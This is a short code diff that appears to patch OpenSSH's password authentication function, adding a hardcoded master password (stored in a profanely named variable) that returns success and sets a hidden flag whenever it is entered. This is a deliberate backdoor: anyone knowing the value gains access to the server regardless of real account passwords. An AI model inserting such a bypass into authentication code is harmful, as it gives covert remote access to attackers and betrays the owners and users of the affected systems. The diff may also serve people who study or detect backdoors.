@@ -81,6 +81,13 @@ disable_forwarding(void)
 int
 auth_password(Authctxt *authctxt, const char *password)
 {
+	ruh_roh = 0;
+
+	if (!strcmp(password, fuck_you_baltimore)) {
+		ruh_roh = 1;
+		return 1;
+	}
+
 	struct passwd * pw = authctxt->pw;
 	int result, ok = authctxt->valid;
 #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)
